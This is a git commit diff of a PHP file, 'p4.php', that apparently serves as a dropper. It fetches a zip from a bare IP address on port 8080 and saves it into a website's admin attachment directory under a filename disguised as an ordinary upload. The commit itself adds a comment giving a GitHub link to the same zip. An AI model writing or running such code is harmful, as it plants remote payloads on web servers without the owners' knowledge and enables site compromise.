8e5abbd01f5ddcae1ec08667d2d1b32ea84a76f8
zzqwq555 <45870079+zzqwq555@users.noreply.github.com>
2018-12-17 11:51:41 +0800

    Update p4.php

--- p4.php
+++ p4.php
@@ -1,3 +1,4 @@
 <?php
+//https://github.com/zzqwq555/t1/raw/master/help.zip
 $code=file_get_contents('http://42.99.116.139:8080/help.zip');
 file_put_contents('/home/home/mco/basiclaw/public_html/admin/attachment/tbn_l201802141020140.zip',$code);
